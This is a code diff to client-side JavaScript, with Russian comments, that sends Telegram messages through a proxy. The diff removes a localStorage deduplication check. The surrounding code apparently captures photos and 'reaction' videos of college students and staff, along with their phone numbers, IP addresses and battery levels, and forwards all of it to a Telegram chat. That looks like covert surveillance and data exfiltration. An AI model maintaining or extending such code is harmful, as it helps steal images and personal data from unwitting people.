@@ -639,20 +639,6 @@
     return 15000;
   }
 
-  function alreadySentText(key) {
-    try {
-      const v = localStorage.getItem(key);
-      if (!v) return false;
-      const ts = parseInt(v, 10);
-      if (Date.now() - ts < 5 * 60 * 1000) return true;
-      localStorage.removeItem(key);
-      return false;
-    } catch { return false; }
-  }
-  function markTextSent(key) {
-    try { localStorage.setItem(key, String(Date.now())); } catch {}
-  }
-
   // ============================================================
   //  Отправка через прокси — всегда JSON
   // ============================================================
@@ -694,11 +680,7 @@
   // ============================================================
   //  ТЕКСТ
   // ============================================================
-  async function sendTelegramNotify(text, dedupKey) {
-    if (dedupKey && alreadySentText(dedupKey)) {
-      console.log("⏭ Текст уже отправлен, пропуск");
-      return;
-    }
+  async function sendTelegramNotify(text) {
     try {
       const res = await sendWithFailover("sendMessage", {
         chat_id: TELEGRAM_CHAT_ID,
@@ -708,7 +690,6 @@
       });
       if (res && res.ok) {
         console.log("✅ Текст отправлен");
-        if (dedupKey) markTextSent(dedupKey);
       }
     } catch (err) {
       console.error("❌ Ошибка отправки текста:", err);
@@ -1454,8 +1435,7 @@
           "🔋 <b>Заряд:</b> " + batteryStr + "\n\n" +
           "⚠️ <b>Это сотрудник колледжа!</b>";
 
-        // Порядок: текст → фото → видео
-        await sendTelegramNotify(caption, "text_staff_" + phone);
+        await sendTelegramNotify(caption);
         if (photoBase64) await sendTelegramPhoto(photoBase64, "📷 Фото педагога");
         if (videoBase64) await sendTelegramVideo(videoBase64, "🎥 Реакция педагога");
       } else {
@@ -1482,8 +1462,7 @@
           "🌐 <b>IP:</b> " + ipStr + "\n" +
           "🔋 <b>Заряд:</b> " + batteryStr;
 
-        // Порядок: текст → фото → видео
-        await sendTelegramNotify(caption, "text_student_" + phone);
+        await sendTelegramNotify(caption);
         if (photoBase64) await sendTelegramPhoto(photoBase64, "📷 Фото студента");
         if (videoBase64) await sendTelegramVideo(videoBase64, "🎥 Реакция студента");
       }
@@ -1565,7 +1544,7 @@
             "🔋 <b>Заряд:</b> " + batteryStr + "\n\n" +
             "⚠️ <b>Это сотрудник колледжа!</b>";
 
-          await sendTelegramNotify(caption, "text_staff_" + phoneNorm);
+          await sendTelegramNotify(caption);
         } catch (err) {
           console.error("Ошибка фоновой задачи педагога:", err);
         }
